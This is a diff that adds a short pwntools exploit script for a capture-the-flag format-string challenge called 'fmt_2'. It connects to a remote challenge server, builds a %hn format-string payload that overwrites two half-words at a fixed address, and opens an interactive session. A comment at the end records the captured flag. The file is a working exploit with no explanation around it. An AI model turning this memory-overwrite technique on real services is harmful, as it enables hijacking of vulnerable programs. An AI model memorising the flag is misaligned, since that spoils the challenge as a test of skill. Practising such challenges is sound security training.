@@ -1,0 +1,22 @@
+from pwn import * 
+
+e = ELF("./fmt_2")
+
+script = '''
+b *vuln
+b *printbuffer + 25
+'''
+
+p = remote("103.69.97.144", 6111)
+#p = gdb.debug("./fmt_2", gdbscript = script)
+
+target = 0x804b2fc
+
+payload = f"%{0x6568}c%22$hn".encode()
+payload += f"%{0x6F72 - 0x6568}c%23$hn".encode()
+payload = payload.ljust(0x1c, b"A")
+payload += p32(target + 2) + p32(target)
+p.sendlineafter(b"say?\n", payload)
+
+p.interactive()
+#BKSEC{1t's_s0_34sy__r19ht?}
